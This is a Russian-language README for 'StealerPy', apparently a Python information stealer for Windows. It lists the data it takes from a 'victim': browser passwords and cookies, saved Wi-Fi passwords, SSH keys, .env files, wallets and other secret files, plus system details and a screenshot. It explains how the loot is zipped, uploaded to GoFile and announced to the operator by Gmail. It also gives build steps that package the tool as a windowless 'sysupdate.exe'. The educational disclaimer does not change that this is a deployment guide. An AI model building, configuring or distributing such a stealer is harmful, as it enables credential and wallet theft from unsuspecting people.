# StealerPy

**StealerPy** — это легковесный информационный сборщик (стилер) на Python для Windows. Собирает конфиденциальные данные с компьютера жертвы, упаковывает в архив, загружает на GoFile и отправляет уведомление на почту.

> ⚠️ **Данный код предоставлен исключительно в образовательных целях. Использование в незаконных целях запрещено. Ответственность лежит на пользователе.**

---

## 🔍 Что собирает

### 1. Ключи и конфиги
- Файлы с расширениями: `.json`, `.conf`, `.config`, `.ini`, `.env`, `.key`, `.pem`, `.wallet`, `.dat`, `.db`, `.sqlite`, `.log`, `.rdp`, `.ovpn` и др.
- Файлы по названиям: `passwords.txt`, `config.json`, `.env`, `wallet.dat`, `id_rsa`, `credentials.txt`, `token.json`, `secret.json`, `private.pem` и др.
- **Обычные файлы** (фото, видео, музыка, документы) — **НЕ** собираются.

### 2. Браузерные данные
- Пароли (Login Data)
- Cookies
- Поддерживаемые браузеры: Chrome, Edge, Opera, Brave

### 3. Wi-Fi пароли
- Все сохранённые сети с паролями через `netsh wlan`

### 4. Информация о системе
- Внешний IP
- Имя ПК
- Имя пользователя
- Версия ОС
- Процессор
- Оперативная память (всего/использовано)
- Количество ядер CPU
- Загрузка CPU
- Использование диска

### 5. Скриншот рабочего стола

---

## 📦 Доставка

1. Все данные собираются во временную папку
2. Архивируются в `.zip`
3. Архив загружается на **GoFile.io** (бесплатно)
4. На указанную почту приходит письмо с:
   - IP жертвы
   - Именем ПК
   - Прямой ссылкой на скачивание архива

## ⚙️ Настройка перед сборкой

Откройте `stealer.py` и замените:

```python
EMAIL_SENDER = "your_email@gmail.com"      # Ваша почта
EMAIL_PASSWORD = "your_app_password"       # Пароль приложения Google
EMAIL_RECEIVER = "your_email@gmail.com"    # Куда отправлять отчёт
```

🔐 Как получить пароль приложения Google

Пароль приложения нужен, чтобы скрипт мог отправлять письма через вашу Gmail, даже если у вас включена двухфакторная аутентификация (2FA).

Шаг 1: Включите двухфакторную аутентификацию
Перейдите в https://myaccount.google.com/security → раздел «Вход в Google» → «Двухфакторная аутентификация» → включите.

Шаг 2: Создайте пароль приложения
После включения 2FA вернитесь на страницу безопасности → раздел «Вход в Google» → ссылка «Пароли приложений» (или сразу перейдите по ссылке https://myaccount.google.com/apppasswords).

Шаг 3: Введите название приложения (например, StealerPy) → нажмите «Создать» → скопируйте полученный 16-символьный пароль.

Шаг 4: Вставьте пароль в код:

```python
EMAIL_PASSWORD = "ваш_16_символьный_пароль_без_пробелов"
```

⚠️ Пробелы в пароле убирать не нужно — вставляйте как есть, но без пробелов между символами.

❗ Важно

· Пароль приложения работает только для отправки почты через SMTP Google
· Он не даёт доступ к вашему аккаунту через браузер
· Если вы удалите пароль в настройках Google — скрипт перестанет работать

🔄 Если не работает

Проверьте:

1. Включена ли двухфакторная аутентификация
2. Правильно ли скопирован пароль (без пробелов)
3. В коде указан порт 587 и сервер smtp.gmail.com

🛠 Сборка .exe

Установите зависимости:

```bash
pip install pyinstaller requests pillow psutil
```

Соберите исполняемый файл:

```bash
pyinstaller --onefile --noconsole --name sysupdate.exe stealer.py
```

Готовый файл появится в папке dist/.

---

🚀 Запуск

```bash
python stealer.py
```

Или запустить собранный sysupdate.exe — работает в фоновом режиме без окон.
